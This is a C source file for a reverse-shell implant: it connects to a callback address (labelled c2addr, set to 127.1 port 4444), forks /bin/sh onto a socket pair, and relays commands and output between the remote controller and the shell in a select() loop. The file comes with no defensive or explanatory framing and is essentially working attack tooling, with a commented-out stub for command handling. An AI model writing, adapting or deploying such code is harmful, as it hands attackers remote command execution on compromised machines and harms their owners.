#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <unistd.h>

#define CALLBACK_IP "127.1"
#define CALLBACK_PORT 4444
#define BUFFER_SIZE 1024

int max(int val_one, int val_two)
{
    return val_one > val_two ? val_one : val_two;
}

int child_setup(int s)
{
    pid_t pid = -1;
    int sp[2] = {0, 0};

    if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
        perror("failed to create interpreter socket pair");
    }

    if ((pid = fork()) < 0)
    {
        perror("fork");
    }

    if (pid == 0)
    {
        close(sp[1]);

        dup2(sp[0], STDIN_FILENO);
        dup2(sp[0], STDOUT_FILENO);
        dup2(sp[0], STDERR_FILENO);

        system("/bin/sh");
    }

    close(sp[0]);

    return sp[1];
}

void interpreter(int sockfd, int child_pipe)
{
    struct sockaddr_in client_addr;
    socklen_t cli_len;
    char sockfd_buf[BUFFER_SIZE];
    char child_buf[BUFFER_SIZE];
    int recvlen = 0;
    ssize_t read_len = 0;
    fd_set read_set, write_set;
    int maxfd = max(sockfd, child_pipe);

    memset(sockfd_buf, 0, BUFFER_SIZE);
    memset(child_buf, 0, BUFFER_SIZE);
    char *command = "test";
    FD_ZERO(&read_set);
    FD_ZERO(&write_set);

    for (;;)
    {

        FD_SET(sockfd, &read_set);
        FD_SET(child_pipe, &read_set);

        //Check if there is data to be written to socks
        if (strlen(sockfd_buf) > 0)
        {
            FD_SET(sockfd, &write_set);
        }
        if (strlen(child_buf) > 0)
        {
            FD_SET(child_pipe, &write_set);
        }

        if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
        {
            perror("select");
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockfd, &write_set)) //sockfd ready to be written
        {
            write(sockfd, sockfd_buf, strlen(sockfd_buf));
            memset(sockfd_buf, 0, BUFFER_SIZE);        
        }
        if(FD_ISSET(child_pipe, &write_set))
        {
            write(child_pipe, child_buf, strlen(child_buf));
            memset(child_buf, 0, BUFFER_SIZE);
        }

        if(FD_ISSET(sockfd, &read_set))
        {
            read(sockfd, child_buf, BUFFER_SIZE);
        }
        if(FD_ISSET(child_pipe, &read_set))
        {
            read(child_pipe, sockfd_buf, BUFFER_SIZE);
        }

        /*
        recvlen = read(sockfd, buf, BUFFER_SIZE);
        if (recvlen == 0)
        {
            return;
        }
        else if (recvlen < 0)
        {
            perror("recvfrom");
            exit(EXIT_FAILURE);
        }

        /* 
        Check for known command
        If unknown command, forward to shell for interpretation
        */
       /* if (strncmp(buf, command, strlen(command)) == 0)
        {
            puts("match!");
        }
        else
        {
            write(child_pipe, buf, strlen(buf));
            memset(buf, 0, BUFFER_SIZE);
            
            read_len = read(child_pipe, buf, BUFFER_SIZE);
            write(sockfd, buf, read_len);
        }
        */
        
    }


    
}

int main()
{
    struct sockaddr_in c2addr;
    int sockfd = 0;
    int child_pipe = 0;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed socket init");
        exit(1);
    }

    memset(&c2addr, 0, sizeof(c2addr));
    c2addr.sin_family = AF_INET;
    c2addr.sin_addr.s_addr = inet_addr(CALLBACK_IP);
    c2addr.sin_port = htons(CALLBACK_PORT); 

    if (connect(sockfd, (struct sockaddr*)&c2addr, sizeof(c2addr)) != 0)
    {
        perror("failed to connect");
        exit(2);
    }

    child_pipe = child_setup(sockfd);

    interpreter(sockfd, child_pipe);

    close(sockfd);

    return 0;
}